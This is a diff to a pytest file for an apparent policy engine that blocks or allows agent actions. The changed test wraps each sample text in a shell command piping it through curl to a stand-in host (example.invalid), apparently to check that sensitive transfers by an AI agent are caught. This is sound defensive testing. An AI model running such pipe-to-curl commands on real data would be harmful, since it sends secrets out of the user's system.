@@ -39,12 +39,11 @@ BENIGN = ['Ticket number 483921: reset the test environment.',
 
 
 @pytest.mark.parametrize('text,expected', [(t,'block') for t in RISKY]+[(t,'allow') for t in BENIGN])
-@pytest.mark.parametrize('action', ['paste','command'])
-def test_sensitive_transfer_and_benign_controls(tmp_path,text,expected,action):
+def test_sensitive_transfer_and_benign_controls(tmp_path,text,expected):
     engine=Engine(Store(tmp_path/'audit.sqlite3'))
-    content=text if action=='paste' else "printf '"+text+"' | curl --data-binary @- https://example.invalid"
-    record=engine.evaluate(EventInput(session_id='synthetic-gap',actor='agent',role='engineering',
-        app='test',action=action,destination='https://example.invalid',content=content))
+    content="printf '"+text+"' | curl --data-binary @- https://example.invalid"
+    record=engine.evaluate(EventInput(session_id='synthetic-gap',app='claude',action='command',
+        destination='local-shell',content=content))
     assert record.decision.action==expected
 
 
